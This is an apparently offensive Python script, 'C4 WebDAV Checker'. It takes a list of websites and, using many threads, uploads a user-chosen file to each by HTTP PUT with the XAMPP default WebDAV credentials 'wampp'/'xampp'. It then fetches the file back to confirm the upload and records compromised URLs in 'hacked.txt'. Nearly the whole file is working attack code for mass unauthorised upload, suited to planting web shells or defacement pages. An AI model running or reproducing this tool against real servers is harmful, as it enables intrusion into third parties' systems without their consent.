#~ C4 WebDAV Checker
#~ Coded by NinjaCR3
#~ Twitter : @Ninja3Sec
#~ I don't accept any responsibility for any illegal usage!

import os
import sys
import threading
from queue import Queue

if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")

class specials:
	GREEN = '\033[92m'
	FAIL = '\033[91m'
	END = '\033[0m'
	
def c4exp(site):
	url = site + "/" + filename
	username = "wampp"
	password = "xampp"
	payload = mypayload
	try:
		r = requests.put(url, data=payload, auth=requests.auth.HTTPDigestAuth(username, password),timeout=10)
		scan = requests.get(url,timeout=10)
		if payload in scan.text:
			print(specials.GREEN + "[" + specials.FAIL + "+" + specials.GREEN + "] " + url + "   [ Successful ]")
			try:
				with open("hacked.txt","a") as f:
					f.write(url + "\n")
			except:
				pass
		else:
			print(specials.FAIL + "[-] " + site + "   [ Failed ]")
	except:
		print(specials.FAIL + "[-] " + site + "   [ Failed ]")
	
def threader():
	while True:
		worker = q.get()
		c4exp(worker)
		q.task_done()

q = Queue()


print((specials.GREEN + "=" + specials.FAIL + "=")*20)
print(specials.GREEN + "|                                      |")
print(specials.GREEN + "|          C4 WebDAV Checker           |")
print(specials.GREEN + "|         with multithreading          |")
print(specials.GREEN + "|          Coded by NinjaCR3           |")
print(specials.GREEN + "|                                      |")
print((specials.GREEN + "=" + specials.FAIL + "=")*20)
print(specials.GREEN)

try:
	import requests
except:
	print(specials.FAIL + "[!] Requests module not found! Please install requests module and try again!" + specials.END)
	sys.exit()

sitelist = input("[*] Site list : ")
filename = input("[*] Filename : ")
targetfile = input("[*] Target file : ")
lenthreads = input("[*] Threads : ")

for x in range(int(lenthreads)):
	t = threading.Thread(target=threader)
	t.daemon = True
	t.start()

try:
	sites = open(sitelist, 'r').read().splitlines()
	mypayload = open(targetfile, 'r').read()
	print(specials.GREEN + "[" + specials.FAIL + "+" + specials.GREEN + "] Scan started! Please wait... :)\n")
except:
	print(specials.FAIL + "[!] Site list or target file not found!" + specials.END)
	sys.exit()    
	
print_lock = threading.Lock()
	
for worker in sites:
	q.put(worker)

q.join()